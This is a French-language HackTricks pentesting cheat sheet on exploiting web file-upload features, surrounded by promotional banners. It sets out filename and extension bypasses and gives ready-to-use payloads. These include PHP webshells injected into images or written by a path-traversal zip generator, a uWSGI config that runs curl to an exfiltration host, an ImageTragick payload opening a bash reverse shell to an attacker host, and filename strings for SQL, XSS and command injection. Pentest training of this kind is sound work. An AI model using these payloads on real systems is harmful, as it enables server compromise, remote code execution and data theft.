# Upload de Fichier

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

Si vous √™tes int√©ress√© par une **carri√®re en piratage** et pirater l'impossible - **nous recrutons !** (_ma√Ætrise du polonais √©crit et parl√© requis_).

{% embed url="https://www.stmcyber.com/careers" %}

## M√©thodologie G√©n√©rale de T√©l√©chargement de Fichier

Autres extensions utiles :

* **PHP** : _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._phps_, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
* **Travailler en PHPv8** : _.php_, _.php4_, _.php5_, _.phtml_, _.module_, _.inc_, _.hphp_, _.ctp_
* **ASP** : _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
* **Jsp** : _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
* **Coldfusion** : _.cfm, .cfml, .cfc, .dbm_
* **Flash** : _.swf_
* **Perl** : _.pl, .cgi_
* **Serveur Web Erlang Yaws** : _.yaws_

### Contourner les v√©rifications des extensions de fichier

1. Si elles s'appliquent, **v√©rifiez** les **extensions pr√©c√©dentes**. Testez-les √©galement en utilisant des **lettres majuscules** : _pHp, .pHP5, .PhAr ..._
2. _V√©rifiez **l'ajout d'une extension valide avant** l'extension d'ex√©cution (utilisez √©galement les extensions pr√©c√©dentes) :_
* _fichier.png.php_
* _fichier.png.Php5_
3. Essayez d'ajouter des **caract√®res sp√©ciaux √† la fin**. Vous pouvez utiliser Burp pour **forcer** tous les caract√®res **ascii** et **Unicode**. (_Notez que vous pouvez √©galement essayer d'utiliser les **extensions pr√©c√©demment** mentionn√©es_)
* _fichier.php%20_
* _fichier.php%0a_
* _fichier.php%00_
* _fichier.php%0d%0a_
* _fichier.php/_
* _fichier.php.\\_
* _fichier._
* _fichier.php...._
* _fichier.pHp5...._
4. Essayez de contourner les protections en **trompant l'analyseur d'extension** c√¥t√© serveur avec des techniques comme **doubler** l'**extension** ou **ajouter des donn√©es inutiles** (des octets **nuls**) entre les extensions. _Vous pouvez √©galement utiliser les **extensions pr√©c√©dentes** pour pr√©parer une meilleure charge utile._
* _fichier.png.php_
* _fichier.png.pHp5_
* _fichier.php#.png_
* _fichier.php%00.png_
* _fichier.php\x00.png_
* _fichier.php%0a.png_
* _fichier.php%0d%0a.png_
* _fichier.phpJunk123png_
5. Ajoutez **une autre couche d'extensions** √† la v√©rification pr√©c√©dente :
* _fichier.png.jpg.php_
* _fichier.php%00.png%00.jpg_
6. Essayez de mettre l'**extension d'ex√©cution avant l'extension valide** et esp√©rez que le serveur est mal configur√©. (utile pour exploiter les mauvaises configurations Apache o√π tout avec l'extension\*\* _**.php**_**, mais** pas n√©cessairement se terminant par .php\*\* ex√©cutera du code) :
* _ex : fichier.php.png_
7. Utilisation des **flux de donn√©es alternatifs NTFS (ADS)** dans **Windows**. Dans ce cas, un caract√®re deux-points ":" sera ins√©r√© apr√®s une extension interdite et avant une extension autoris√©e. Par cons√©quent, un **fichier vide avec l'extension interdite** sera cr√©√© sur le serveur (par ex. "fichier.asax:.jpg"). Ce fichier pourrait √™tre modifi√© ult√©rieurement en utilisant d'autres techniques telles que l'utilisation de son nom de fichier court. Le motif "**::$data**" peut √©galement √™tre utilis√© pour cr√©er des fichiers non vides. Par cons√©quent, l'ajout d'un caract√®re point apr√®s ce motif pourrait √©galement √™tre utile pour contourner d'autres restrictions (.e.g. "fichier.asp::$data.")
8. Essayez de d√©passer les limites du nom de fichier. L'extension valide est coup√©e. Et le code PHP malveillant reste. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 octets
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # moins 4 ici et ajout de .png
# T√©l√©chargez le fichier et v√©rifiez la r√©ponse pour combien de caract√®res il autorise. Disons 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Cr√©ez la charge utile
AAA<--SNIP 232 A-->AAA.php.png
```
### Contourner le type de contenu, le num√©ro magique, la compression et le redimensionnement

* Contourner les v√©rifications de **Content-Type** en d√©finissant la **valeur** de l'en-t√™te **Content-Type** √† : _image/png_, _text/plain_, _application/octet-stream_
1. **Liste de mots Content-Type** : [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/web/content-type.txt)
* Contourner la v√©rification du **num√©ro magique** en ajoutant au d√©but du fichier les **octets d'une vraie image** (pour tromper la commande _file_). Ou introduire le shell √† l'int√©rieur des **m√©tadonn√©es** :\
`exiftool -Comment="<?php echo 'Commande :'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` ou vous pourriez √©galement **introduire directement la charge utile** dans une image :\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
* Si une **compression est ajout√©e √† votre image**, par exemple en utilisant des biblioth√®ques PHP standard comme [PHP-GD](https://www.php.net/manual/fr/book.image.php), les techniques pr√©c√©dentes ne seront pas utiles. Cependant, vous pourriez utiliser le **chunk PLTE** [**technique d√©finie ici**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) pour ins√©rer du texte qui **survivra √† la compression**.
* [**Github avec le code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_plte\_png.php)
* La page web pourrait √©galement **redimensionner** l'**image**, en utilisant par exemple les fonctions PHP-GD `imagecopyresized` ou `imagecopyresampled`. Cependant, vous pourriez utiliser le **chunk IDAT** [**technique d√©finie ici**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) pour ins√©rer du texte qui **survivra √† la compression**.
* [**Github avec le code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_idat\_png.php)
* Une autre technique pour cr√©er une charge utile qui **survivra √† un redimensionnement d'image**, en utilisant la fonction PHP-GD `thumbnailImage`. Cependant, vous pourriez utiliser le **chunk tEXt** [**technique d√©finie ici**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) pour ins√©rer du texte qui **survivra √† la compression**.
* [**Github avec le code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen\_tEXt\_png.php)

### Autres astuces √† v√©rifier

* Trouver une vuln√©rabilit√© pour **renommer** le fichier d√©j√† t√©l√©charg√© (pour changer l'extension).
* Trouver une vuln√©rabilit√© de **Local File Inclusion** pour ex√©cuter la porte d√©rob√©e.
* **Divulgation d'informations possible** :
1. T√©l√©charger **plusieurs fois** (et en **m√™me temps**) le **m√™me fichier** avec le **m√™me nom**
2. T√©l√©charger un fichier avec le **nom** d'un **fichier** ou **dossier** qui **existe d√©j√†**
3. T√©l√©charger un fichier avec **‚Äú.‚Äù, ‚Äú..‚Äù, ou ‚Äú‚Ä¶‚Äù comme nom**. Par exemple, dans Apache sous **Windows**, si l'application enregistre les fichiers t√©l√©charg√©s dans le r√©pertoire ‚Äú/www/uploads/‚Äù, le nom de fichier ‚Äú.‚Äù cr√©era un fichier appel√© ‚Äúuploads‚Äù dans le r√©pertoire ‚Äú/www/‚Äù.
4. T√©l√©charger un fichier qui ne peut pas √™tre facilement supprim√© comme **‚Äú‚Ä¶:.jpg‚Äù** dans **NTFS** (Windows).
5. T√©l√©charger un fichier dans **Windows** avec des **caract√®res non valides** tels que `|<>*?‚Äù` dans son nom (Windows).
6. T√©l√©charger un fichier dans **Windows** en utilisant des **noms r√©serv√©s** (**interdits**) tels que CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8 et LPT9.
* Essayez √©galement de **t√©l√©charger un ex√©cutable** (.exe) ou un fichier **.html** (moins suspect) qui **ex√©cutera du code** lorsqu'il sera accidentellement ouvert par la victime.

### Astuces d'extensions sp√©ciales

Si vous essayez de t√©l√©charger des fichiers sur un serveur **PHP**, [jetez un ≈ìil √† l'astuce **.htaccess** pour ex√©cuter du code](https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp#code-execution-via-httaccess).\
Si vous essayez de t√©l√©charger des fichiers sur un serveur **ASP**, [jetez un ≈ìil √† l'astuce **.config** pour ex√©cuter du code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

Les fichiers `.phar` sont comme les fichiers `.jar` pour Java, mais pour PHP, et peuvent √™tre **utilis√©s comme un fichier PHP** (en l'ex√©cutant avec PHP, ou en l'incluant dans un script...).

L'extension `.inc` est parfois utilis√©e pour les fichiers PHP qui ne sont utilis√©s que pour **importer des fichiers**, donc, √† un moment donn√©, quelqu'un pourrait avoir autoris√© **cette extension √† √™tre ex√©cut√©e**.

## **Jetty RCE**

Si vous pouvez t√©l√©charger un fichier XML sur un serveur Jetty, vous pouvez obtenir une [RCE car les nouveaux fichiers \*.xml et \*.war sont automatiquement trait√©s](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** Ainsi, comme mentionn√© dans l'image suivante, t√©l√©chargez le fichier XML dans `$JETTY_BASE/webapps/` et attendez le shell !

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../.gitbook/assets/image (1044).png>)

## **uWSGI RCE**

Pour une exploration d√©taill√©e de cette vuln√©rabilit√©, consultez la recherche originale : [Exploitation de l'RCE uWSGI](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Les vuln√©rabilit√©s d'ex√©cution de commandes √† distance (RCE) peuvent √™tre exploit√©es dans les serveurs uWSGI si l'on a la capacit√© de modifier le fichier de configuration `.ini`. Les fichiers de configuration uWSGI utilisent une syntaxe sp√©cifique pour incorporer des variables "magiques", des espaces r√©serv√©s et des op√©rateurs. Notamment, l'op√©rateur '@', utilis√© comme `@(nom_fichier)`, est con√ßu pour inclure le contenu d'un fichier. Parmi les divers sch√©mas pris en charge dans uWSGI, le sch√©ma "exec" est particuli√®rement puissant, permettant la lecture de donn√©es √† partir de la sortie standard d'un processus. Cette fonctionnalit√© peut √™tre manipul√©e √† des fins malveillantes telles que l'ex√©cution de commandes √† distance ou l'√©criture/lecture de fichiers arbitraires lorsque qu'un fichier de configuration `.ini` est trait√©.

Consid√©rez l'exemple suivant d'un fichier `uwsgi.ini` nuisible, illustrant divers sch√©mas :
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
L'ex√©cution de la charge utile se produit lors de l'analyse du fichier de configuration. Pour que la configuration soit activ√©e et analys√©e, le processus uWSGI doit √™tre red√©marr√© (potentiellement apr√®s un crash ou en raison d'une attaque par d√©ni de service) ou le fichier doit √™tre configur√© pour un rechargement automatique. La fonction de rechargement automatique, si activ√©e, recharge le fichier √† des intervalles sp√©cifi√©s lors de la d√©tection de modifications.

Il est crucial de comprendre la nature laxiste de l'analyse du fichier de configuration de uWSGI. Plus pr√©cis√©ment, la charge utile discut√©e peut √™tre ins√©r√©e dans un fichier binaire (tel qu'une image ou un PDF), √©largissant ainsi la port√©e potentielle de l'exploitation.

## **Astuce de t√©l√©chargement de fichier/SSRF avec wget**

Dans certains cas, vous pouvez constater qu'un serveur utilise **`wget`** pour **t√©l√©charger des fichiers** et vous pouvez **indiquer** l'**URL**. Dans ces cas, le code peut v√©rifier que l'extension des fichiers t√©l√©charg√©s est dans une liste blanche pour s'assurer que seuls les fichiers autoris√©s seront t√©l√©charg√©s. Cependant, **cette v√©rification peut √™tre contourn√©e.**\
La **longueur maximale** d'un **nom de fichier** sous **Linux** est de **255**, cependant, **wget** tronque les noms de fichiers √† **236** caract√®res. Vous pouvez **t√©l√©charger un fichier appel√© "A"\*232+".php"+".gif"**, ce nom de fichier **contournera** la **v√©rification** (comme dans cet exemple **".gif"** est une **extension valide**) mais `wget` renommera le fichier en **"A"\*232+".php"**.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‚ÄòAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php‚Äô

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‚ÄòAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php‚Äô saved [10/10]
```
Notez que **une autre option** √† laquelle vous pourriez penser pour contourner cette v√©rification est de faire en sorte que le **serveur HTTP redirige vers un fichier diff√©rent**, de sorte que l'URL initiale contourne la v√©rification, puis wget t√©l√©chargera le fichier redirig√© avec le nouveau nom. Cela **ne fonctionnera pas** **√† moins que** wget ne soit utilis√© avec le **param√®tre** `--trust-server-names` car **wget t√©l√©chargera la page redirig√©e avec le nom du fichier indiqu√© dans l'URL d'origine**.

## Outils

* [Upload Bypass](https://github.com/sAjibuu/Upload\_Bypass) est un outil puissant con√ßu pour aider les Pentesters et les Chasseurs de Bugs √† tester les m√©canismes de t√©l√©chargement de fichiers. Il exploite diverses techniques de prime aux bugs pour simplifier le processus d'identification et d'exploitation des vuln√©rabilit√©s, garantissant des √©valuations approfondies des applications web.

## Du t√©l√©chargement de fichiers √† d'autres vuln√©rabilit√©s

* D√©finissez le **nom de fichier** sur `../../../tmp/lol.png` et essayez d'atteindre une **travers√©e de chemin**
* D√©finissez le **nom de fichier** sur `sleep(10)-- -.jpg` et vous pourriez r√©ussir une **injection SQL**
* D√©finissez le **nom de fichier** sur `<svg onload=alert(document.domain)>` pour r√©aliser une XSS
* D√©finissez le **nom de fichier** sur `; sleep 10;` pour tester une injection de commande (plus de [trucs d'injection de commandes ici](../command-injection.md))
* [**XSS** dans le t√©l√©chargement de fichiers image (svg)](../xss-cross-site-scripting/#xss-uploading-files-svg)
* T√©l√©chargement de fichier **JS** + **XSS** = [exploitation des **Service Workers**](../xss-cross-site-scripting/#xss-abusing-service-workers)
* [**XXE dans le t√©l√©chargement de fichiers svg**](../xxe-xee-xml-external-entity.md#svg-file-upload)
* [**Redirection ouverte** via le t√©l√©chargement de fichiers svg](../open-redirect.md#open-redirect-uploading-svg-files)
* Essayez **diff√©rentes charges utiles svg** depuis [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)\*\*\*\*
* [Vuln√©rabilit√© **ImageTrick** c√©l√®bre](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
* Si vous pouvez **indiquer au serveur web de r√©cup√©rer une image √† partir d'une URL**, vous pourriez essayer d'exploiter un [SSRF](../ssrf-server-side-request-forgery/). Si cette **image** doit √™tre **enregistr√©e** sur un site **public**, vous pourriez √©galement indiquer une URL depuis [https://iplogger.org/invisible/](https://iplogger.org/invisible/) et **voler des informations sur chaque visiteur**.
* [**Contournement XXE et CORS** avec le t√©l√©chargement de fichiers PDF-Adobe](pdf-upload-xxe-and-cors-bypass.md)
* PDF sp√©cialement con√ßus pour XSS : La [page suivante pr√©sente comment **injecter des donn√©es PDF pour obtenir une ex√©cution JS**](../xss-cross-site-scripting/pdf-injection.md). Si vous pouvez t√©l√©charger des PDF, vous pourriez pr√©parer un PDF qui ex√©cutera du JS arbitraire en suivant les indications donn√©es.
* T√©l√©chargez le \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) pour v√©rifier si le serveur dispose d'un **antivirus**
* V√©rifiez s'il y a une **limite de taille** pour le t√©l√©chargement de fichiers

Voici un top 10 des choses que vous pouvez r√©aliser en t√©l√©chargeant (√† partir de [ici](https://twitter.com/SalahHasoneh1/status/1281274120395685889)) :

1. **ASP / ASPX / PHP5 / PHP / PHP3** : Webshell / RCE
2. **SVG** : XSS stock√©e / SSRF / XXE
3. **GIF** : XSS stock√©e / SSRF
4. **CSV** : Injection CSV
5. **XML** : XXE
6. **AVI** : LFI / SSRF
7. **HTML / JS** : Injection HTML / XSS / Redirection ouverte
8. **PNG / JPEG** : Attaque de saturation de pixels (DoS)
9. **ZIP** : RCE via LFI / DoS
10. **PDF / PPTX** : SSRF / XXE AVEUGLE

#### Extension Burp

{% embed url="https://github.com/portswigger/upload-scanner" %}

## En-t√™tes magiques

* **PNG** : `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03["`
* **JPG** : `"\xff\xd8\xff"`

Reportez-vous √† [https://en.wikipedia.org/wiki/List\_of\_file\_signatures](https://en.wikipedia.org/wiki/List\_of\_file\_signatures) pour d'autres types de fichiers.

### T√©l√©chargement automatique de fichiers Zip/Tar d√©compress√©s

Si vous pouvez t√©l√©charger un ZIP qui va √™tre d√©compress√© √† l'int√©rieur du serveur, vous pouvez faire 2 choses :

#### Lien symbolique

T√©l√©chargez un lien contenant des liens symboliques vers d'autres fichiers, puis, en acc√©dant aux fichiers d√©compress√©s, vous acc√©derez aux fichiers li√©s :
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### D√©compresser dans diff√©rents dossiers

La cr√©ation inattendue de fichiers dans des r√©pertoires lors de la d√©compression est un probl√®me significatif. Malgr√© les hypoth√®ses initiales selon lesquelles cette configuration pourrait prot√©ger contre l'ex√©cution de commandes au niveau du syst√®me d'exploitation via des t√©l√©versements de fichiers malveillants, le support de compression hi√©rarchique et les capacit√©s de travers√©e de r√©pertoires du format d'archive ZIP peuvent √™tre exploit√©s. Cela permet aux attaquants de contourner les restrictions et de s'√©chapper des r√©pertoires de t√©l√©versement s√©curis√©s en manipulant la fonctionnalit√© de d√©compression de l'application cibl√©e.

Une exploitation automatis√©e pour cr√©er de tels fichiers est disponible sur [**evilarc sur GitHub**](https://github.com/ptoomey3/evilarc). L'utilitaire peut √™tre utilis√© comme suit:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
De plus, l'**astuce du lien symbolique avec evilarc** est une option. Si l'objectif est de cibler un fichier tel que `/flag.txt`, un lien symbolique vers ce fichier doit √™tre cr√©√© dans votre syst√®me. Cela garantit qu'evilarc ne rencontre pas d'erreurs pendant son fonctionnement.

Voici un exemple de code Python utilis√© pour cr√©er un fichier zip malveillant :
```python
#!/usr/bin/python
import zipfile
from io import BytesIO

def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Abus de la compression pour la pulv√©risation de fichiers**

Pour plus de d√©tails, **consultez le message original sur**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1. **Cr√©ation d'un Shell PHP**: Le code PHP est √©crit pour ex√©cuter des commandes transmises via la variable `$_REQUEST`.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```
2. **Pulv√©risation de fichiers et cr√©ation de fichiers compress√©s**: Plusieurs fichiers sont cr√©√©s et une archive zip est assembl√©e contenant ces fichiers.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```
3. **Modification avec un √©diteur hexad√©cimal ou vi**: Les noms des fichiers √† l'int√©rieur du zip sont modifi√©s en utilisant vi ou un √©diteur hexad√©cimal, en changeant "xxA" en "../" pour traverser les r√©pertoires.

```bash
:set modifiable
:%s/xxA/..\//g
:x!
```

## ImageTragic

T√©l√©chargez ce contenu avec une extension d'image pour exploiter la vuln√©rabilit√© **(ImageMagick, 7.0.1-1)** (√† partir de l'[exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Int√©gration d'une coquille PHP dans un PNG

Int√©grer une coquille PHP dans le chunk IDAT d'un fichier PNG peut contourner efficacement certaines op√©rations de traitement d'images. Les fonctions `imagecopyresized` et `imagecopyresampled` de PHP-GD sont particuli√®rement pertinentes dans ce contexte, car elles sont couramment utilis√©es pour redimensionner et r√©√©chantillonner des images, respectivement. La capacit√© de la coquille PHP int√©gr√©e √† rester inchang√©e par ces op√©rations est un avantage significatif pour certains cas d'utilisation.

Une exploration d√©taill√©e de cette technique, y compris sa m√©thodologie et ses applications potentielles, est fournie dans l'article suivant : ["Encodage de coquilles Web dans les chunks IDAT de PNG"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Cette ressource offre une compr√©hension compl√®te du processus et de ses implications.

Plus d'informations sur : [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Fichiers Polyglottes

Les fichiers polyglottes servent d'outil unique en cybers√©curit√©, agissant comme des cam√©l√©ons pouvant exister de mani√®re valide dans plusieurs formats de fichier simultan√©ment. Un exemple intrigant est un [GIFAR](https://en.wikipedia.org/wiki/Gifar), un hybride qui fonctionne √† la fois comme un GIF et une archive RAR. De tels fichiers ne se limitent pas √† cette association ; des combinaisons comme GIF et JS ou PPT et JS sont √©galement r√©alisables.

L'utilit√© principale des fichiers polyglottes r√©side dans leur capacit√© √† contourner les mesures de s√©curit√© qui filtrent les fichiers en fonction de leur type. Une pratique courante dans diverses applications consiste √† autoriser uniquement certains types de fichiers pour le t√©l√©chargement, tels que JPEG, GIF ou DOC, afin de r√©duire les risques li√©s √† des formats potentiellement dangereux (par exemple, JS, PHP ou des fichiers Phar). Cependant, un polyglotte, en respectant les crit√®res structurels de plusieurs types de fichiers, peut contourner discr√®tement ces restrictions.

Malgr√© leur adaptabilit√©, les polyglottes rencontrent des limites. Par exemple, bien qu'un polyglotte puisse incarner simultan√©ment un fichier PHAR (PHp ARchive) et un JPEG, le succ√®s de son t√©l√©chargement peut d√©pendre des politiques d'extension de fichier de la plateforme. Si le syst√®me est strict en mati√®re d'extensions autoris√©es, la simple dualit√© structurelle d'un polyglotte peut ne pas suffire √† garantir son t√©l√©chargement.

Plus d'informations sur : [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

## R√©f√©rences

* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20insecure%20files)
* [https://github.com/modzero/mod0BurpUploadScanner](https://github.com/modzero/mod0BurpUploadScanner)
* [https://github.com/almandin/fuxploider](https://github.com/almandin/fuxploider)
* [https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)
* [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
* [https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a](https://medium.com/swlh/polyglot-files-a-hackers-best-friend-850bf812dd8a)

<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

Si vous √™tes int√©ress√© par une **carri√®re en piratage** et souhaitez pirater l'impiratable - **nous recrutons !** (_ma√Ætrise du polonais √† l'√©crit et √† l'oral requise_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez** üí¨ le [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
